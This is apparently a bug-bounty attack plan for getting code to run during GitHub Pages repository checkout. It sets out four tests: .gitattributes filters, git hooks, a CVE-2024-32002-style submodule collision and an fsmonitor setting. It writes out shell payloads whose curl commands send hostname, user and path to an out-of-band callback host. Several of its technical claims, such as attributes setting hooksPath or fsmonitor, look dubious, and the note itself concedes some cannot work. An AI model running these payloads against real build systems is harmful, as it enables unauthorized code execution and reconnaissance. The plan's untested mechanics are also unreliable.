# VECTOR 2: .gitattributes Filter Execution (Code Exec on Checkout)

## Hypothesis
When GitHub Pages build clones/checks out the repo using command-line git,
.gitattributes filter.clean/smudge commands execute arbitrary code.
The scope explicitly mentions "vulnerabilities in the command-line Git tools
when cloning or checking-out repositories."

## Test A: Basic filter exec

Create `.gitattributes`:
```
*.html filter=exploit
```

Create `.git/config` equivalent via repo (NOTE: .git/config is NOT pushed):
The filter definition normally lives in .git/config, BUT we can try:

1. Create a file `exploit.sh`:
```bash
#!/bin/bash
curl https://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/gitattributes-exec?host=$(hostname)&user=$(whoami)&pwd=$(pwd)
cat
```

2. In `.gitattributes`:
```
*.html filter=exploit
```

3. The trick: git config for filter must be set. On clone, git does NOT
   execute filters unless configured. BUT:
   - If the build system runs `git config --local` from repo files → exec
   - If there's a `.gitconfig` include mechanism → exec
   - If `core.hooksPath` is set via attributes → exec

## Test B: Git hooks via core.hooksPath in .gitattributes (CVE-2024-32002 style)

Create directory structure:
```
mkdir -p .git/hooks
cat > .git/hooks/post-checkout << 'EOF'
#!/bin/bash
curl https://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/hook-exec?host=$(hostname)
EOF
chmod +x .git/hooks/post-checkout
```

NOTE: .git/ is not tracked. But with CVE-2024-32002 (git < 2.45.1):
- Submodule with case-insensitive path collision can write to .git/hooks/

## Test C: Submodule + symlink race (CVE-2024-32002 variant)

```bash
# Create a submodule that exploits case-insensitive filesystem
git submodule add https://github.com/YOUR_USER/evil-submodule.git A/modules/x
# The submodule contains a symlink that collides with .git/hooks/
```

## Test D: fsmonitor hook via .gitattributes

```
# .gitattributes
* fsmonitor=exploit.sh
```

With `exploit.sh` in repo root (executable).

## Oracle
OOB callback to: d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro
If ANY callback received → code execution confirmed.

## Kill criteria
- Git version on build host >= 2.45.1 (CVE-2024-32002 patched)
- Build uses `git archive` instead of `git clone` (no checkout = no hooks)
- `core.hooksPath` is overridden to /dev/null
- `filter.*` commands are stripped/ignored
